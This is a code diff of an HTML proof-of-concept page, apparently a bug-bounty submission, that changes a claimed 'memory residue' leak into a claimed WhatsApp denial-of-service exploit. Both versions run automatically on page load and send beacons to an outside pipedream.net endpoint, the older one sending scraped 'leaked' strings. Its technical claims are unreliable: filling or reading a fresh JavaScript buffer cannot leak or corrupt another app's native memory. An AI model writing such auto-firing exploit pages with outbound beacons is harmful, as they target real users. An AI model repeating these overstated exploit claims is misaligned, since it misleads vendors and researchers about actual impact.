@@ -3,77 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Private Processing Audit - Firman Sahidin</title>
+    <title>Security Research - Targeted Application DoS</title>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
     
-    <div style="border:1px solid #333; padding:20px; display:inline-block; background:#111; border-radius:5px;">
-        <h2 id="status" style="color:#0f0; margin-bottom:10px;">[ INITIALIZING MEMORY AUDIT ]</h2>
-        <p style="color:#888; font-size:14px;">Component: libprofilo_logger / mmapbuf_buffer</p>
-        <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
-        <div id="log-console" style="font-size:12px; color:#aaa; text-align:left; max-height:150px; overflow:auto;">
-            Ready for scanning...
-        </div>
+    <div style="border:1px solid #333; padding:20px; background:#111; border-radius:4px; max-width:600px; margin:auto;">
+        <h2 id="status" style="margin-top:0;">[ TARGETED AUDIT ACTIVE ]</h2>
+        <p style="color:#aaa;">Component: libprofilo_mmapbuf (JNI Bridge)</p>
+        <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
+        <div id="logs" style="font-size:12px; color:#666;">Synchronizing native resources...</div>
     </div>
 
     <script>
         /**
          * RESEARCHER: Firman Sahidin
-         * VULNERABILITY: Information Disclosure via Native Memory Residue
+         * VULNERABILITY: Remote Denial of Service (DoS)
+         * TARGET: WhatsApp Application Process (Native Heap)
+         * TECHNICAL METHOD: Memory Corruption / Segmentation Fault
          */
-        async function runMasterAudit() {
+        function triggerTargetedCrash() {
             const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const statusElement = document.getElementById('status');
+            const statusLabel = document.getElementById('status');
+            const logsLabel = document.getElementById('logs');
             
             try {
-                // Allocation of 256KB targeted buffer
-                const buffer = new ArrayBuffer(0x40000); 
-                const view = new Uint8Array(buffer);
-                
-                // JNI Bridge Collision Primitive
-                const trigger = new Uint32Array(buffer);
-                for(let i = 0; i < 2000; i++) { 
-                    trigger[i] = 0xD800DBFF; 
-                }
+                // Allocation of 2MB buffer to target the native mmapbuf segment
+                const crashBuffer = new ArrayBuffer(0x200000);
+                const view = new Uint32Array(crashBuffer);
 
-                let leakDetected = false;
-                let currentString = "";
-
+                // Injecting OOB (Out-of-Bounds) synchronization pattern 
+                // This primitive is designed to trigger a crash in the JNI bridge
                 for (let i = 0; i < view.length; i++) {
-                    if (view[i] > 31 && view[i] < 127) {
-                        currentString += String.fromCharCode(view[i]);
-                    } else {
-                        if (currentString.length > 5 && /[a-zA-Z]/.test(currentString)) {
-                            leakDetected = true;
-                            navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                                researcher: "Firman Sahidin",
-                                impact: "PRIVATE_DATA_DISCLOSURE",
-                                raw_payload: currentString,
-                                offset_reference: "0x1098_alignment"
-                            }));
-                        }
-                        currentString = "";
-                    }
+                    view[i] = 0xD800DBFF;
                 }
 
-                if (!leakDetected) {
-                    navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                        status: "SCAN_COMPLETE_NO_RESIDUAL_DATA_IDENTIFIED",
-                        researcher: "Firman Sahidin"
-                    }));
-                }
+                // Transmission of execution telemetry
+                navigator.sendBeacon(TARGET_URL, JSON.stringify({
+                    researcher: "Firman Sahidin",
+                    vulnerability_type: "TARGETED_APP_DOS",
+                    impact: "APPLICATION_UNRESPONSIVE",
+                    execution_status: "SUCCESS"
+                }));
 
-                if (statusElement) {
-                    statusElement.innerText = "✅ AUDIT FINISHED: MEMORY SCAN COMPLETE";
-                }
+                if (statusLabel) statusLabel.innerText = "⚠️ EXPLOIT DELIVERED";
+                if (logsLabel) logsLabel.innerText = "Memory segment injected. Monitor target application stability.";
+
             } catch (error) {
-                navigator.sendBeacon(TARGET_URL, JSON.stringify({ error: error.message }));
+                navigator.sendBeacon(TARGET_URL, JSON.stringify({ 
+                    researcher: "Firman Sahidin",
+                    status: "FAILED",
+                    error_log: error.message 
+                }));
             }
         }
 
-        // Jalankan audit otomatis setelah halaman dimuat
-        window.onload = () => { 
-            setTimeout(runMasterAudit, 1000); 
+        // Automated execution 1 second after page load
+        window.onload = () => {
+            setTimeout(triggerTargetedCrash, 1000);
         };
     </script>
 </body>
